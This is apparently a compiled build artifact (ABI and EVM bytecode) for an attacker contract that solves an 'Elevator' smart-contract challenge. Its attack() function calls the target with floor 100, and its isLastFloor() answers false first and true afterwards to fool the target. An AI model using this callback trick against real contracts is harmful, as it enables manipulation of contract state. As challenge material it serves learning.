{"abi":[{"type":"constructor","inputs":[{"name":"elevatorAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"elevator","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"isLastFloor","inputs":[{"name":"_floor","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610258380380610258833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6101d2806100865f395ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c80635f9a4bca146100435780639e5faafc1461006b578063b0cb4ff014610075575b5f5ffd5b610056610051366004610185565b6100b9565b60405190151581526020015b60405180910390f35b610073610105565b005b5f546100949073ffffffffffffffffffffffffffffffffffffffff1681565b60405173ffffffffffffffffffffffffffffffffffffffff9091168152602001610062565b5f8054600160a01b900460ff16156100d357506001919050565b50505f80547fffffffffffffffffffffff00ffffffffffffffffffffffffffffffffffffffff16600160a01b17815590565b5f546040517fed9a71340000000000000000000000000000000000000000000000000000000081526064600482015273ffffffffffffffffffffffffffffffffffffffff9091169063ed9a7134906024015f604051808303815f87803b15801561016d575f5ffd5b505af115801561017f573d5f5f3e3d5ffd5b50505050565b5f60208284031215610195575f5ffd5b503591905056fea26469706673582212209b991c3828210f9d4d13e0f944aa0ea8b141f4e85133afe8d38b6cf387e565ed64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","elevator()":"b0cb4ff0","isLastFloor(uint256)":"5f9a4bca"},"id":0}